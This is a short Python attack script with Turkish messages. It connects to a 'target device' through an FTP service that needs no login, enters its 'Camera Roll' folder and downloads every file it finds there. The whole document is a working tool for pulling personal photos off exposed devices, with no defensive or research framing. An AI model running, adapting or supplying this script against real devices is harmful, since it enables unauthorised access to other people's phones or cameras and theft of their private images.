import sys
from ftplib import FTP
from colorama import Fore

if len(sys.argv) <= 1:
    print ("Usage: ./ftp-nologin.py [host] [port]")
    exit()

host = sys.argv[1]
port = int(sys.argv[2])

files = []

def append_file(s):
    files.append(s.split(' ')[-1])

blocks = []
def get_blocks(d):
    blocks.append(d)

ftp = FTP()
print(Fore.BLUE+'[i]'+Fore.RESET+f' "{host}" Bağlanıyor...')
try:
    ftp.connect(host, port)
except Exception as e:
    print(Fore.RED+'[-]'+Fore.RESET+f' Hedef cihaza bağlanırken hata: "{str(e)}"')
    sys.exit()
ftp.set_pasv(1)
ftp.cwd("Camera Roll")
ftp.retrlines('LIST', append_file)
files.pop(0)

for filename in files:
    print(Fore.BLUE+'[i]'+Fore.RESET+f' "{filename}" indirmeye çalışıyorum...')
    ftp.retrbinary('RETR /Camera Roll/' + filename, get_blocks)
    f = open(filename, 'wb')
    for block in blocks:
        f.write(block)
    f.close()
    print(Fore.YELLOW+'[+]'+Fore.RESET+f' Dosya olarak kaydedildi: {filename}')
    blocks = []

ftp.quit()